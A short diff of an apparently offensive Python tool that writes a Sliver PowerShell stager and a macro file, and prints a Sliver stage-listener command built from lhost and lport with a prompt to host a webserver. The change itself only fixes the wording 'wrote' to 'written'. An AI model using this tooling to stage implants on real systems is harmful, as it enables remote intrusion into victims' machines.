@@ -34,7 +34,7 @@ End Sub
    file = open ("Sliver.ps1","w")
    file.write (payload)
    file.close
-   print (CGREEN + '#> Sliver_Macro.txt was wrote to CWD\n' + CEND)
+   print (CGREEN + '#> Sliver_Macro.txt was written to CWD\n' + CEND)
    if 'Sliver_Macro.txt' in itemlist:
       print (cwd + '/Sliver_Macro.txt\n')
 
@@ -44,7 +44,7 @@ End Sub
    print (f'stage-listener --url http://"{lhost}":"{lport}" --profile win64')
    print ('')
    print (CRED + '==== Sliver.ps1 Script Staging ====\n' + CEND)
-   print (CGREEN + '#> Sliver.ps1 was wrote to CWD\n' + CEND)
+   print (CGREEN + '#> Sliver.ps1 was written to CWD\n' + CEND)
    if 'Sliver.ps1' in itemlist:
       print (cwd + '/Sliver.ps1\n')
    print (CGREEN + '#> Host a webserver\n' + CEND)
